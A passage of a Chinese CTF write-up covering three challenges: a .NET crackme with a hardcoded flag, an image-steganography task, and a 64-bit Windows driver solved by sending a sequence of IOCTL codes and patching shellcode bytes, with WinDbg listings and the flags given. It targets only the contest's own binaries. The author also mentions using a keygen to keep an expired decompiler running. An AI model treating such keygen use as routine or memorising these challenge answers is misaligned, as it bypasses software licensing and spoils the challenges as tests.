&lt;p&gt;&lt;strong&gt;3. babyCrack&lt;/strong&gt;&lt;br&gt;107.189.158.112/d55757a7ccf958399789e18e1d8199de/babyCrack.zip&lt;br&gt;PEID查了下，是.net，马上祭出神奇.net reflector， 结果工具过期，重新下了个注册机，搞定，几个函数，翻了下，看到flag：hctf{bABy&lt;em&gt;CtsvlmE&lt;/em&gt;!}&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;private void button1_Click(object sender, EventArgs e)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	bool flag = false;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	Config.user = this.textBox1.Text;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	string user = Config.user;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	string str2 = &amp;quot;hctf&amp;#123;bABy_CtsvlmE_!&amp;#125;&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if (str2.CompareTo(user) == 0)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		flag = true;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if (flag)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		MessageBox.Show(&amp;quot;good !!!&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. stego_final&lt;/strong&gt;&lt;br&gt;图片隐写题，Stegsolve各种通道翻了一下，看到张二维码，用手机一扫，识别不了，背影有些黑点，又不会图片处理，ps一番，终于找到flag：flag{hctf_3xF$235#^3}&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. wzwzDingDing&lt;/strong&gt;&lt;br&gt;被坑的最惨的一道题，是个64位驱动，代码真不多，只有30多个函数，翻了一个遍，流程分析清楚，最后有个字符串提示 “OK!YOU ARE REALLY GOOD!Also, there is a } left!”&lt;br&gt;就是说代码执行到这，应该会得到flag，然后这个是在IRP_MJ_DEVICE_CONTROL函数中，函数对应多个ctl code，分别是：&lt;br&gt;0x88102004，0x88102008, 0x8810200C, 0x88102014, 0x88102010，以及都不是前面的一个ctl code，每个ctl code对应分支都会对偏移0x48E0的一个标志进行操作，最后得到0xFFFFFF，执行提示字符串的分支。&lt;br&gt;下面是触发的ring3代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;HANDLE hDev = CreateFileA(DRV_SYM, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(hDev == INVALID_HANDLE_VALUE)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] open dev error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;printf(&amp;quot;[+] open dev success!\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;char buf[20] = &amp;quot;^lejAJ]O&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DWORD dwReturn = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(! DeviceIoControl(hDev, 0x88102004, buf, strlen(buf), buf, strlen(buf),  &amp;amp;dwReturn, NULL))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] dev control error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;char buf1[20] = &amp;quot;MNIII&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(! DeviceIoControl(hDev, 0x88102004, buf1, strlen(buf1), buf1, strlen(buf1),  &amp;amp;dwReturn, NULL))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] dev control error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(! DeviceIoControl(hDev, 0x88102008, NULL, 0, NULL, 0,  &amp;amp;dwReturn, NULL))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] dev control error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//8810200C&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(! DeviceIoControl(hDev, 0x8810200C, NULL, 0, NULL, 0,  &amp;amp;dwReturn, NULL))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] dev control error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(! DeviceIoControl(hDev, 0x88102014, NULL, 0, NULL, 0,  &amp;amp;dwReturn, NULL))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] dev control error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//88102010&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(! DeviceIoControl(hDev,  0x88102010, NULL, 0, NULL, 0,  &amp;amp;dwReturn, NULL))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	printf(&amp;quot;[-] dev control error %d\n&amp;quot;, GetLastError());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后就进入了提示字符分支，结果在这里 &lt;code&gt;text:0000000000012361 call    [rsp+0C8h+ShellCode]&lt;/code&gt;，就崩了，被坑了好久，这里需要结合题目提示flag: HCTF{‘intput’.encode(‘hex’)}&lt;br&gt;就是需要修复那段shellcode，让其正确执行，然后顺利执行到提示字符串位置，分支中还有代码提示需要修复的代码字节位置，然后就是根据一个堆栈平衡就能修复（开始明显看不懂题意啊，坑）&lt;br&gt;修复前代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d90 l5b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wzwzDingDing+0x2d90:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d90 （10） 5152          adc     byte ptr [rcx+52h],dl =&amp;gt;(50 //push rax push rcx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d93 53              push    rbx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d94 55              push    rbp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d95 56              push    rsi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d96 57              push    rdi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d97 （90）              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d98 （90）              nop//push r8  (41 50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d99 4151            push    r9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d9b 4152            push    r10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d9d 4153            push    r11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d9f 4154            push    r12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da1 4155            push    r13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da3 4156            push    r14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da5 4157            push    r15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da7 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da8 （90）              nop//(48 83 EC 28 sub rsp,28h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da9 (90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85daa (90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dab (90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dac 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dad 48c7c600000000  mov     rsi,0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85db4 488b040e        mov     rax,qword ptr [rsi+rcx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85db8 4883f007        xor     rax,7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dbc 4889040e        mov     qword ptr [rsi+rcx],rax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc0 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc1 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc2 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc3 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc4 48ffc6          inc     rsi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc7 4883fe0b        cmp     rsi,0Bh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dcb 74e0            je      wzwzDingDing+0x2dad (fffff880`02f85dad)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dcd 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dce 4883c428        add     rsp,28h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd2 415f            pop     r15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd4 415e            pop     r14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd6 415d            pop     r13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd8 415c            pop     r12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dda 415b            pop     r11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85ddc 415a            pop     r10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dde 4159            pop     r9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de0 4158            pop     r8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de2 5f              pop     rdi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de3 5e              pop     rsi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de4 5d              pop     rbp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de5 5b              pop     rbx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de6 5a              pop     rdx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de7 (90)              nop //59 pop rcx &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de8 58              pop     rax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de9 (90)              nop//ret C3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dea 00cc            add     ah,cl&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修复后代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;kd&amp;gt; u fffff880`02f85d90 l5b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wzwzDingDing+0x2d90:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d90 50              push    rax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d91 51              push    rcx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d92 52              push    rdx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d93 53              push    rbx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d94 55              push    rbp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d95 56              push    rsi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d96 57              push    rdi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d97 4150            push    r8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d99 4151            push    r9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d9b 4152            push    r10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d9d 4153            push    r11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85d9f 4154            push    r12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da1 4155            push    r13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da3 4156            push    r14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da5 4157            push    r15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da7 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85da8 4883ec28        sub     rsp,28h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dac 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dad 48c7c600000000  mov     rsi,0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85db4 488b040e        mov     rax,qword ptr [rsi+rcx]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85db8 4883f007        xor     rax,7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dbc 4889040e        mov     qword ptr [rsi+rcx],rax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc0 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc1 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc2 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc3 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc4 48ffc6          inc     rsi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dc7 4883fe0b        cmp     rsi,0Bh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dcb 74e0            je      wzwzDingDing+0x2dad (fffff880`02f85dad)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dcd 90              nop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dce 4883c428        add     rsp,28h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd2 415f            pop     r15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd4 415e            pop     r14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd6 415d            pop     r13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dd8 415c            pop     r12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dda 415b            pop     r11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85ddc 415a            pop     r10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dde 4159            pop     r9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de0 4158            pop     r8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de2 5f              pop     rdi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de3 5e              pop     rsi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de4 5d              pop     rbp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de5 5b              pop     rbx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de6 5a              pop     rdx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de7 59              pop     rcx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de8 58              pop     rax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85de9 c3              ret&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;fffff880`02f85dea 00cc            add     ah,cl&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后flag：HCTF{5041504883ec2859c3}，注意大小写啊&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 其他&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就这么多了，经验太少，就各路大牛路过指导&lt;/p&gt;
</content>
    
    <summary type="html">
    
